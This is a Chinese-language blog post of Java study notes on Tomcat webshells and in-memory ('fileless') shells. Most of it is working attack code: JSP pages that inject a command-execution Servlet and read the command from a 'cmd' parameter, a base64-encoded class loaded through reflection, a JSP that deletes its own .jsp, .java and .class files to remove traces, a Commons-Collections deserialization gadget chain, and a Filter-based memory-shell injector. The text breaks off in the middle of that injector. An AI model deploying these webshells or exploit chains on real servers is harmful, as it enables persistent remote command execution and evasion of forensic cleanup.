---
title: "Java学习笔记Ⅴ"
slug: "java-study-notes-05"
description: "webshell&内存马踩坑不完全指北（上）"
date: 2022-05-30T23:20:41+08:00
categories: ["NOTES&SUMMARY"]
series: ["Java学习笔记"]
tags: ["Java"]
draft: false
toc: true
---

各路博客没少看，踩的坑怎么还超级多呢……所有参考链接附在文末

------

> 本文涉及到的Java环境&相关依赖，仅供参考：
>
> Java 1.8.0_311 (8u311)
>
> tomcat-embed-core 8.5.73, tomcat-embed-jasper 8.5.73
>
> commons-collections 3.2.1
>
> javassist 3.20.0-GA

## jsp&文件落地

可能很多人会觉得：都内存马了怎么还能文件落地？？？

有一说一，确实，但逻辑不是这样讲的：应该是内存马可以做到文件不落地——也就是说删除上马时凭借的.java .jsp .class文件后一样可以运行于内存中并执行命令（除非单独kill），而上马的过程中根据使用手段的不同会产生一定程度的文件落地

对于jsp来说，一定会在初次请求时被tomcat自动生成对应的.java和.class文件并放在临时目录中，毕竟jsp本质就是一个Servlet；我们来看一些例子（以下均为动态注册Servlet型内存马）

### 虚假的jsp

代码参考自[JAVA内存马的“一生”](https://xz.aliyun.com/t/11003)

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
    final String name = "servletshell";
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    // 注册Servlet对象 并重写service方法
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {

        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");    // get传入cmd参数
            // 确定目标操作系统
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[] {"sh", "-c", cmd} : new String[] {"cmd.exe", "/c", cmd}; // 确定命令执行的格式
            // 处理输入&命令执行
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            // 回显执行结果
            Scanner s = new Scanner( in ).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {

        }
    };
    // 创建Wrapper对象来封装前面new Servlet对象
    org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());
    // 为内存马添加路由映射
    standardContext.addChild(newWrapper);
    standardContext.addServletMappingDecoded("/servletmemshell",name);
    response.getWriter().write("inject success");
%>
<html>
<head>
    <title>servletshell</title>
</head>
<body>

</body>
</html>
```

很好理解，通过注册Servlet并重写service方法来做到命令执行+回显，访问一次这个jsp就可以添加Servlet类型内存马到/servletmemshell路径下，但我们借助[java-memshell-scanner](https://github.com/c0ny1/java-memshell-scanner)就可以发现事情没我们想的那么完美

![image-20220531001914278](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531001914278.png)

把它dump下来

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.apache.jsp;

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

class test_jsp$1 implements Servlet {
    test_jsp$1(test_jsp var1) {
        this.this$0 = var1;
    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        String cmd = servletRequest.getParameter("cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }

        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = (new Scanner(in)).useDelimiter("\\a");
        String output = s.hasNext() ? s.next() : "";
        PrintWriter out = servletResponse.getWriter();
        out.println(output);
        out.flush();
        out.close();
    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {
    }
}
```

可以说所谓的“内存马”显露无疑，被看的干干净净

究其原因并不复杂，这里dump下来的`test_jsp$1.class`文件就是jsp马中`Servlet servlet = new Servlet(){}`的部分，它实现了servletshell的主要功能；而因为Servlet直接被注册到当前上下文中了，所以当我们手动删除这个jsp和附带的所有.class文件后会发现/servletshell路径下的内存马依旧可以照常工作，memshell scanner会这样显示

![image-20220531004046566](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531004046566.png)

真 · 内存马，不过只要使用memshell scanner的kill功能（从上下文中解绑Servlet）即可杀掉这个马，并且由于此前删掉了上马所用的.jsp文件，所以做到了彻底清除servletshell

### 字节码jsp

可能有师傅能看出问题所在：这就离谱，你内存马都不用个字节码加载 这肯定会连着jsp文件一起被编译啊？？？

有一说一，确实，那我们把上面的在jsp内直接new Servlet的做法换做字节码的形式

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%
    String classCode = "yv66vgAAADQAkQoAHQBNCAA0CwBOAE8IAFAKAFEAUgoACQBTCABUCgAJAFUHAFYIAFcIAFgIAFkIAFoKAFsAXAoAWwBdCgBeAF8HAGAKABEAYQgAYgoAEQBjCgARAGQKABEAZQgAZgsAZwBoCgBpAGoKAGkAawoAaQBsBwBtBwBuBwBvAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MU2VydmxldFRlc3Q7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAcAEAEGdldFNlcnZsZXRDb25maWcBAB8oKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAHc2VydmljZQEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAdpc0xpbnV4AQABWgEABW9zVHlwAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQANU3RhY2tNYXBUYWJsZQcAVgcAOgcAcQcAYAcAcgEADmdldFNlcnZsZXRJbmZvAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEAEFNlcnZsZXRUZXN0LmphdmEMAB8AIAcAcwwAdAB1AQAHb3MubmFtZQcAdgwAdwB1DAB4AEkBAAN3aW4MAHkAegEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwB7DAB8AH0MAH4AfwcAgAwAgQCCAQARamF2YS91dGlsL1NjYW5uZXIMAB8AgwEAAlxhDACEAIUMAIYAhwwAiABJAQAABwCJDACKAIsHAIwMAI0AjgwAjwAgDACQACABAAtTZXJ2bGV0VGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQAhABwAHQABAB4AAAAGAAEAHwAgAAEAIQAAADMAAQABAAAABSq3AAGxAAAAAgAiAAAACgACAAAACgAEAAsAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAA4AIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQABACEAAAAsAAEAAQAAAAIBsAAAAAIAIgAAAAYAAQAAABEAIwAAAAwAAQAAAAIAJAAlAAAAAQAuAC8AAgAhAAABigAEAAsAAAChKxICuQADAgBOBDYEEgS4AAU6BRkFxgATGQW2AAYSB7YACJkABgM2BBUEmQAYBr0ACVkDEgpTWQQSC1NZBS1TpwAVBr0ACVkDEgxTWQQSDVNZBS1TOga4AA4ZBrYAD7YAEDoHuwARWRkHtwASEhO2ABQ6CBkItgAVmQALGQi2ABanAAUSFzoJLLkAGAEAOgoZChkJtgAZGQq2ABoZCrYAG7EAAAADACIAAAA6AA4AAAAVAAkAFwAMABgAEwAZACUAGgAoABwAVgAeAGMAIABzACEAhwAiAI8AIwCWACQAmwAlAKAAJgAjAAAAcAALAAAAoQAkACUAAAAAAKEAMAAxAAEAAAChADIAMwACAAkAmAA0ADUAAwAMAJUANgA3AAQAEwCOADgANQAFAFYASwA5ADoABgBjAD4AOwA8AAcAcwAuAD0APgAIAIcAGgA/ADUACQCPABIAQABBAAoAQgAAACEABf4AKAcAQwEHAEMZUQcARP4ALgcARAcARQcARkEHAEMAKgAAAAYAAgArAEcAAQBIAEkAAQAhAAAALAABAAEAAAACAbAAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAACACQAJQAAAAEASgAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAAtACMAAAAMAAEAAAABACQAJQAAAAEASwAAAAIATA==";
    // 获取上下文
    ServletContext servletContext = request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
    java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
    defineClass.setAccessible(true);
    byte[] evil = java.util.Base64.getDecoder().decode(classCode);
    Class<?> servletClass = (Class<?>) defineClass.invoke(classLoader, evil, 0, evil.length);

    final String name = "servletshell";
    // 使用 Wrapper 封装 Servlet
    org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet((Servlet) servletClass.newInstance());
    newWrapper.setServletClass(servletClass.getName());
    // 为内存马添加路由映射
    standardContext.addChild(newWrapper);
    standardContext.addServletMappingDecoded("/servletmemshell",name);
    response.getWriter().write("inject success");
%>
<html>
<head>
    <title>servletshell</title>
</head>
<body>

</body>
</html>
```

![image-20220531183048214](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png)

不过并没有看起来这么美好——服务器上一下子多了1个jsp 1个class 1个java

### 金蝉脱壳的jsp

对于上面示范的动静较大的2种方式不能说一无是处吧，只能说是乏善可陈，而在[Tomcat容器攻防笔记之JSP金蝉脱壳](https://www.anquanke.com/post/id/224698)这篇文章中作者提出了jsp金蝉脱壳的思路，代码如下

```jsp
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.mapper.MappingData" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.jasper.compiler.JspRuntimeContext" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@ page import="org.apache.jasper.JspCompilationContext" %>
<%@ page import="java.io.File" %>
<%
    //从request对象中获取request属性
    Field requestF = request.getClass().getDeclaredField("request");
    requestF.setAccessible(true);
    Request req = (Request) requestF.get(request);
    //获取MappingData
    MappingData mappingData = req.getMappingData();
    //获取StandrardWrapper
    Field wrapperF = mappingData.getClass().getDeclaredField("wrapper");
    wrapperF.setAccessible(true);
    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
    //获取jspServlet对象
    Field instanceF = wrapper.getClass().getDeclaredField("instance");
    instanceF.setAccessible(true);
    Servlet jspServlet = (Servlet) instanceF.get(wrapper);
    //获取rctxt属性
    Field rctxt = jspServlet.getClass().getDeclaredField("rctxt");
    rctxt.setAccessible(true);
    JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);
    //获取jsps属性内容
    Field jspsF = jspRuntimeContext.getClass().getDeclaredField("jsps");
    jspsF.setAccessible(true);
    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
    //获取对应的JspServletWrapper
    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
    //获取ctxt属性保存的JspCompilationContext对象
    Field ctxt = jsw.getClass().getDeclaredField("ctxt");
    ctxt.setAccessible(true);
    JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);
    File targetFile;
    targetFile = new File(jspCompContext.getClassFileName());	//删掉jsp的.class
    targetFile.delete();
    targetFile = new File(jspCompContext.getServletJavaFileName());	//删掉jsp的java文件
    targetFile.delete();
    //删除jsp文件
    String __jspName = this.getClass().getSimpleName().replaceAll("_", ".");
    String path=application.getRealPath(__jspName);
    File file = new File(path);
    file.delete();
%>
```

![image-20220531183048214](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png)

![image-20220531185316461](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531185316461.png)通过大量的反射修改tomcat对jsp编译时的一些设置，做到上马后删除自身jsp并跳过jsp编译为class和java文件的过程，可以完全不留痕——好！！很有精神！！！

## 反序列化

虽然前面我们得到了可以删除自身的金蝉脱壳jsp，但有个灵魂拷问——如果能传jsp了为什么不直接传冰蝎？确实，实际场景/CTF中更多的是反序列化RCE，为了方便我们可能会接着上内存马，**如果能再扩展一下冰蝎或哥斯拉那就更好了**

以CC11链为例，这是它的基本链

```java
package ccTest;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class CC11 {
    protected static byte[] getBytescode() throws Exception {
        // 利用javassist动态创建恶意字节码
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet 避免报错
        return cc.toBytecode();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{getBytescode()});
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_class", null);

        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);	// 占位

        LazyMap map = (LazyMap)LazyMap.decorate(new HashMap(),transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);

        HashMap hashset_map = (HashMap) f.get(hashset);
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        f2.setAccessible(true);

        // 替换key为TiedMap
        Object[] array = (Object[])f2.get(hashset_map);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            setFieldValue(node, "key", tiedmap);
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
            keyField.setAccessible(true);
            keyField.set(node,tiedmap);
        }
		// 替换 防止生成payload的时候就触发rce
        setFieldValue(transformer, "iMethodName", "newTransformer");

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11"));
            outputStream.writeObject(hashset);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc11"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

具体的我就不多分析了，可以近似为CC2+CC6，用TemplatestImpl加载字节码，恶意类由javassist生成

如何扩展这个看起来只能执行单句指令的简易poc？简单，我们将tomcat Filter内存马部分单独写一份TomcatInject.java文件，替换掉这里的`getBytescode`，让它不要自己生成恶意类了，直接读取TomcatInject.class的字节码即可

```java
package ccTest;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class CC11Template {

    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes();
        byte[][] targetByteCodes = new byte[][]{bytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);

        // 利用反射调用 templates 中的 newTransformer 方法
        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        // 我们要设置 HashSet 的 map 为我们的 HashMap
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        // 在 invoke 之后，
        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Test4.ser"));
            outputStream.writeObject(hashset);
            outputStream.close();

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    public static byte[] getBytes() throws IOException {
        InputStream inputStream = new FileInputStream(new File("E:\\JavaStudy\\test05\\target\\classes\\ccTest\\TomcatInject.class"));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}
```

有了这个CC11的模板，剩下的就是注入内存马部分了，详细分析可以参见三梦师傅的[基于tomcat的内存 Webshell 无文件攻击技术](https://xz.aliyun.com/t/7388#toc-2)（太强了太强了），代码如下（有稍作修改）

```java
package ccTest;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

public class TomcatInject extends AbstractTranslet implements Filter {
    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "amiz";

    static {
        try {
            // 反射修改WRAP_SAME_OBJECT值为true
            Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");    // 获取modifiers字段
            modifiersField.setAccessible(true);   //将变量设置为可访问
            modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL); // 取消FINAL属性
            f.setAccessible(true);    // 将变量设置为可访问
            if (!f.getBoolean(null)) {
                f.setBoolean(null, true); // 将变量设置为true
            }

            // 初始化lastServicedRequest
            c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            f = c.getDeclaredField("lastServicedRequest");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());   //设置ThreadLocal对象
            }

            // 初始化lastServicedResponse
            f = c.getDeclaredField("lastServicedResponse");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());   // 设置ThreadLocal对象
            }

            // 获取上下文StandardContext
            ServletContext servletContext = getServletContext();
            if (servletContext != null){
                Field ctx = servletContext.getClass().getDeclaredField("context");
                ctx.setAccessible(true);
                ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext);

                Field stdctx = appctx.getClass().getDeclaredField("context");
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(appctx);

                if (standardContext != null){
                    // 这样设置不会抛出报错
                    Field stateField = org.apache.catalina.util.LifecycleBase.class
                            .getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, LifecycleState.STARTING_PREP);

                    Filter myFilter =new TomcatInject();
                    // 调用doFilter来动态添加Filter 也可以利用反射
                    javax.servlet.FilterRegistration.Dynamic filterRegistration =
                            servletContext.addFilter(filterName,myFilter);

                    // 进行一些简单的设置
                    filterRegistration.setInitParameter("encoding", "utf-8");
                    filterRegistration.setAsyncSupported(false);
                    // 设置基本的 url pattern
                    filterRegistration
                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                    new String[]{"/*"});

                    // 将服务重新修改回来，不然的话服务会无法正常进行
                    if (stateField != null){
                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
                    }

                    // 设置好之后调用filterstart来启动我们的 filter
                    if (standardContext != null){
                        Method filterStartMethod = StandardContext.class.getDeclaredMethod("filterStart");
                        filterStartMethod.setAccessible(true);
                        filterStartMethod.invoke(standardContext,null);

                        // 把filter插到第一位
                        Class ccc = null;
                        try {
                            ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        } catch (Throwable t){}
                        if (ccc == null) {
                            try {
                                ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                            } catch (Throwable t){}
                        }

                        Method m = Class.forName("org.apache.catalina.core.StandardContext")
                                .getDeclaredMethod("findFilterMaps");
                        Object[] filterMaps = (Object[]) m.invoke(standardContext);
                        Object[] tmpFilterMaps = new Object[filterMaps.length];
                        int index = 1;
                        for (int i = 0; i < filterMaps.length; i++) {
                            Object o = filterMaps[i];
                            m = ccc.getMethod("getFilterName");
                            String name = (String) m.invoke(o);
                            if (name.equalsIgnoreCase(filterName)) {
                                tmpFilterMaps[0] = o;
                            } else {
                                tmpFilterMaps[index++] = filterMaps[i];
                            }
                        }
                        for (int i = 0; i < filterMaps.length; i++) {
                            filterMaps[i] = tmpFilterMaps[i];
                        }
                    }
                }
            }

        } catch (Exception e) {
            // e.printStackTrace();
        }
    }

    private static ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ServletRequest servletRequest = null;
        Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
        f.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) f.get(null);

        if (threadLocal != null && threadLocal.get() != null) {
            servletRequest = (ServletRequest) threadLocal.get();    // 证明前半部分成功
        }

        // 如果失败则换其他方式
        // spring获取法1
        if (servletRequest == null) {
            try {
                c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                Method m = c.getMethod("getRequestAttributes");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                m = c.getMethod("getRequest");
                servletRequest = (ServletRequest) m.invoke(o);
            } catch (Throwable t) {}
        }
        if (servletRequest != null)
            return servletRequest.getServletContext();

        // spring获取法2
        try {
            c = Class.forName("org.springframework.web.context.ContextLoader");
            Method m = c.getMethod("getCurrentWebApplicationContext");
            Object o = m.invoke(null);
            c = Class.forName("org.springframework.web.context.WebApplicationContext");
            m = c.getMethod("getServletContext");
            ServletContext servletContext = (ServletContext) m.invoke(o);
            return servletContext;
        } catch (Throwable t) {}
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
